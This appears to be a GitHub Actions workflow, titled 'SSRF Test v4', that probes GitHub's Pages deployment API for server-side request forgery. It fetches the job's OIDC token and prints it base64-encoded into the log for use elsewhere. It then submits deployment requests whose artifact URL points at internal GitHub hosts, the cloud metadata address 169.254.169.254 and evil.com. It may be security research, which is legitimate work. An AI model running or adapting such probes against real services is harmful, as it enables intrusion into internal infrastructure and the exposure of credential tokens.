name: SSRF Test v4
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
  pages: write

jobs:
  ssrf-test:
    runs-on: ubuntu-latest
    environment:
      name: github-pages
    steps:
    - name: Test via github-script (mirrors actions/deploy-pages exactly)
      uses: actions/github-script@v7
      with:
        script: |
          // Get OIDC token exactly like actions/deploy-pages does
          const oidcToken = await core.getIDToken("api.github.com");
          core.info(`OIDC token obtained (first 20 chars): ${oidcToken.substring(0,20)}...`);
          
          // Output base64 for external testing
          const b64 = Buffer.from(oidcToken).toString("base64");
          core.info(`OIDC_B64: ${b64}`);
          
          const targets = [
            "http://ssrf-target.iad.github.net/",
            "http://ssrf-target.iad.github.net:8080/",
            "http://169.254.169.254/latest/meta-data/",
            "https://evil.com/"
          ];
          
          for (const target of targets) {
            core.info(`\n=== Testing: ${target} ===`);
            try {
              const response = await github.request("POST /repos/{owner}/{repo}/pages/deployments", {
                owner: context.repo.owner,
                repo: context.repo.repo,
                artifact_url: target,
                pages_build_version: context.sha,
                oidc_token: oidcToken,
                headers: {
                  "X-GitHub-Api-Version": "2022-11-28"
                }
              });
              core.info(`Status: ${response.status}`);
              core.info(`Response: ${JSON.stringify(response.data)}`);
            } catch(e) {
              core.info(`Error status: ${e.status}`);
              core.info(`Error data: ${JSON.stringify(e?.response?.data)}`);
            }
          }
